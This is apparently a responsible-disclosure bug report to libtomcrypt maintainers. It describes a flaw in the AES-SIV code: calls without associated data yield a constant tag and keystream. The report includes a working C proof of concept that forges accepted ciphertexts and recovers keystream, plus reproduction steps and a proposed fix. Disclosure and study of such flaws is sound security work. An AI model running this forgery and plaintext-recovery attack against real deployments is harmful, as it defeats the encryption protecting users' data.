description: In src/encauth/siv/siv.c, s_siv_S2V() (and the equivalent check in siv_memory()) treats the caller supplying zero AD components — or an empty first AD string — as the RFC 5297 n=0 case and returns CMAC(K1, <one>) without reading the plaintext. In SIV the plaintext is always the last S2V input, so n is at least 1 and that branch should be unreachable. The resulting V is a per-key constant, so every message under a key gets the same 16-byte authentication tag and the same CTR keystream. An attacker who observes a single ciphertext can therefore forge arbitrary ciphertexts that decrypt successfully (V || anything passes the tag check) and recover every other plaintext via the standard fixed-keystream XOR attack, including choosing the plaintext their forgery decrypts to.
reproduction: 1. Capture any ciphertext V || C produced under key K with no AD.
2. Extract the first 16 bytes as V (constant for K).
3. Recover keystream KS = C XOR known/guessed plaintext (or XOR two ciphertext bodies to get P1 XOR P2).
4. Forge V || (desired_plaintext XOR KS); receiver recomputes the same constant V and accepts.
5. XOR any other captured ciphertext body with KS to recover its plaintext.
technical_details:
Hi --

I've found a logic bug in libtomcrypt's AES-SIV implementation.

AES-SIV is an authenticated-encryption mode that's supposed to be safe

to use without a nonce: the authentication tag is derived from the

plaintext itself, so distinct messages can't collide. In libtomcrypt,

when the caller supplies no "associated data" (which is the normal way

to use SIV for things like wrapping keys) the plaintext is never mixed

into the tag at all, and every message under a given key gets the same

16-byte tag and is encrypted with the same keystream. Observing a

single ciphertext is therefore enough to forge arbitrary new

ciphertexts that decrypt successfully, and to recover every other

plaintext encrypted under that key. The attached C program encrypts

two different messages, shows the tags are identical, and shows a

forged ciphertext acceptance.

(Up-front disclosure: an LLM found this bug. I validated the bug myself,

and have confirmed the PoC works to the best of my understanding.

I stand by this report myself personally and vouch for its correctness.)

This is one of eleven libtomcrypt findings from the same scan. The

others are less severe. I could either send them over all to you right

away without manual validation, or if you'd prefer we can have them

validated first but this will take a bit more time. If you can let me

know what you'd prefer I'll go with whatever is better for you.

Onto the bug.

SIV (RFC 5297) builds an authenticated-encryption mode out of two

standard AES pieces: CMAC (a keyed MAC over arbitrary-length input that

outputs a 16-byte tag) and CTR mode (which turns AES into a stream

cipher by encrypting an incrementing counter and XORing the result with

the plaintext). SIV takes a double-length key (32 bytes for

AES-128-SIV, 48 for AES-192, 64 for AES-256) and splits it in half:

the first half K1 keys the CMAC, the second half K2 keys the CTR.

Encryption takes the plaintext plus zero or more "associated data" (AD)

strings: headers, nonces, whatever else the caller wants bound to the

ciphertext. It first computes a 16-byte "synthetic IV" called V by

running a function called S2V over K1, all the AD strings, and the

plaintext:

    V = S2V(K1, AD_1, ..., AD_m, plaintext)

Then it encrypts the plaintext with AES-CTR keyed by K2, using V (with

two bits masked off) as the initial counter, and outputs V prepended

to the ciphertext. V doubles as the authentication tag and the

IV. Because the plaintext is one of the inputs to S2V, distinct

plaintexts produce distinct V values, and so SIV safe even when the

caller doesn't supply a nonce.

S2V (RFC 5297 sec 2.4) is defined as a function over a vector of n

strings. Roughly: it starts from CMAC(K, <zero>), folds each string in

with a doubling-and-XOR step, and finishes with a CMAC over the last

string combined with the running value. The spec gives it a special

case at the top: "if n = 0, return CMAC(K, <one>)", where <one> is the

16-byte encoding of the integer 1.

Inside SIV, that the caller of S2V always passes the plaintext as the

last string. So n = m + 1, which is at least 1 even when there are

zero AD components. Thus the n = 0 branch is unreachable from

SIV-Encrypt or SIV-Decrypt.

libtomcrypt's s_siv_S2V() (src/encauth/siv/siv.c:162-198) maps "caller

supplied no AD components" to "n = 0" and takes the short-circuit:

    if(ad == NULL || adlen == NULL || ad[0] == NULL || adlen[0] == 0) {

       err = s_siv_S2V_one(cipher, key, keylen, V, Vlen);

    } else {

       ...

       err = s_siv_S2V_T(&ctx, in, inlen, D, V, Vlen);

    }

s_siv_S2V_one returns CMAC(K1, <one>). The function arguments (the

plaintext!) aren't read on this path. Thus, V is a per-key

constant. The same branch is taken if adlen[0] == 0, so a

present-but-empty first AD string also triggers it.

The varargs entry point siv_memory() has the identical test at

siv.c:455-458.

With the value V constant, both security properties of the AEAD fail

at once.

Integrity: on decrypt, the receiver strips the first 16 bytes as V,

CTR-decrypts the rest, recomputes S2V over the recovered plaintext,

and compares. But "recomputes S2V" on the no-AD path means "recomputes

the same per-key constant", which matches the V the attacker copied

from any observed ciphertext. This means V || anything returns

CRYPT_OK, and so in one observation the attacker gets an unlimited

number of forgeries.

Confidentiality: the CTR initial counter is derived from V (two bits

masked), so it's also constant. CTR mode with a fixed counter produces

a fixed keystream, and CTR ciphertext is plaintext XOR keystream. The

standard trivial attack here leaks the plaintext: C1 XOR C2 = P1 XOR

P2, and one known or guessable plaintext recovers the keystream

outright. By combining the two, the attacker can choose the plaintext

their forgery decrypts to, by sending V || (desired_plaintext XOR

keystream).

I don't think that Zero-AD SIV is an edge case. It looks like the

library's own crypt.tex documentation (line 2591) says SIV "does not

enforce" the nonce/AAD and "leaves it up to the user". siv_test() at

siv.c:706-732, for example, calls siv_memory with no AD in an encrypt

loop and decrypt loop, and only checks that the result round-trips to

the original without comparing the tag. LTC_SIV_MODE --- the

preprocessor define that controls whether SIV is compiled into the

library at all --- is enabled by default (tomcrypt_custom.h:311), so

there's no build-time gate.

It looks like SIV landed on the develop branch and is not in the last

tagged release (1.18.2, 2018). But it seems that develop has been the

de-facto upstream for several years and is what most downstream

packaging tracks.

The fix, I think, is to make the no-AD path still fold the plaintext in

as the n = 1 case does: initialise D = CMAC(K1, <zero>) and then call

s_siv_S2V_T over (in, inlen). I've attached a patch that does this for

both s_siv_S2V and siv_memory.

The patch does break siv_test()'s 1000-iteration round-trip loop at

siv.c:706-732 though. That loop calls siv_memory with the same buffer

as both input and output; on encrypt, siv_memory writes V to

out[0..15] before CTR-reading in[0..15], so with in == out the first

16 plaintext bytes are clobbered. This only round-tripped before

because V was a constant (so clobber-then-encrypt,

decrypt-then-recompute-constant matched). With a correct V the

recomputed tag differs and the loop reports CRYPT_ERROR.  I believe

the test, not the fix, is what needs to change there. But this is

getting a bit far outside of my knowledge, so happy to adjust if you'd

rather handle it differently.

Thanks, and please let me know if you'd like to discuss anything,

Nicholas

To reproduce on a fresh Ubuntu 24.04 install:

  git clone https://github.com/libtom/libtommath.git

  git clone https://github.com/libtom/libtomcrypt.git

  ( cd libtommath && make -j )

  ( cd libtomcrypt && make -j \

      CFLAGS="-DUSE_LTM -DLTM_DESC -I../libtommath" \

      EXTRALIBS=../libtommath/libtommath.a )

  cat > /tmp/sivpoc.c <<'EOF'

  #include <tomcrypt.h>

  #include <stdio.h>

  #include <string.h>

  static void hex(const char *lbl, const unsigned char *b, unsigned long n) {

      printf("%-18s", lbl); for (unsigned long i=0;i<n;i++)

printf("%02x", b[i]);

      printf("\n");

  }

  int main(void) {

      unsigned char key[32] = {0};               /* K1 || K2, zeros */

      unsigned char pt1[20], pt2[20];

      memset(pt1, 0xAA, sizeof pt1);

      memset(pt2, 0x55, sizeof pt2);             /* pt2 = ~pt1 */

      unsigned char ct1[36], ct2[36], forged[36], out[20];

      unsigned long ct1len=sizeof ct1, ct2len=sizeof ct2, outlen=sizeof out;

      const unsigned char *ad[] = { NULL };

      unsigned long        adl[] = { 0 };

      register_cipher(&aes_desc);

      int aes = find_cipher("aes");

      siv_encrypt_memory(aes, key, 32, ad, adl, pt1, 20, ct1, &ct1len);

      siv_encrypt_memory(aes, key, 32, ad, adl, pt2, 20, ct2, &ct2len);

      hex("V(tag) of ct1:", ct1, 16);

      hex("V(tag) of ct2:", ct2, 16);

      printf("V1 == V2 ?  %s\n", memcmp(ct1, ct2, 16)==0 ? "YES (BUG)":"no");

      /* keystream reuse: ct_body XOR pt = constant keystream */

      unsigned char ks[20];

      for (int i=0;i<20;i++) ks[i] = ct1[16+i] ^ pt1[i];

      /* forgery: V || (desired_pt XOR keystream), decrypts to desired_pt */

      memcpy(forged, ct1, 16);

      for (int i=0;i<20;i++) forged[16+i] = 0x42 ^ ks[i];

      int e = siv_decrypt_memory(aes, key, 32, ad, adl, forged, 36,

out, &outlen);

      printf("decrypt forged -> err=%d (%s)\n", e, error_to_string(e));

      hex("decrypted pt:", out, outlen);

      /* control: with AD, a tampered ciphertext is rejected */

      const unsigned char *ad2[] = { (const unsigned char*)"hdr", NULL };

      unsigned long adl2[] = { 3, 0 };

      unsigned char ctA[36]; unsigned long ctAlen=sizeof ctA;

      siv_encrypt_memory(aes, key, 32, ad2, adl2, pt1, 20, ctA, &ctAlen);

      ctA[20] ^= 1;  outlen = sizeof out;

      e = siv_decrypt_memory(aes, key, 32, ad2, adl2, ctA, ctAlen,

out, &outlen);

      printf("[CONTROL with-AD tampered] err=%d (%s)\n", e, error_to_string(e));

      return 0;

  }

  EOF

  cc /tmp/sivpoc.c -Ilibtomcrypt/src/headers \

     libtomcrypt/libtomcrypt.a libtommath/libtommath.a -o /tmp/sivpoc

  /tmp/sivpoc

  # V(tag) of ct1:    a3582dddfa01ffc4d94be62deb0972d8

  # V(tag) of ct2:    a3582dddfa01ffc4d94be62deb0972d8

  # V1 == V2 ?  YES (BUG)

  # decrypt forged -> err=0 (CRYPT_OK)

  # decrypted pt:     4242424242424242424242424242424242424242

  # [CONTROL with-AD tampered] err=1 (CRYPT_ERROR)
title: libtomcrypt AES-SIV: universal forgery and plaintext recovery when called without AD
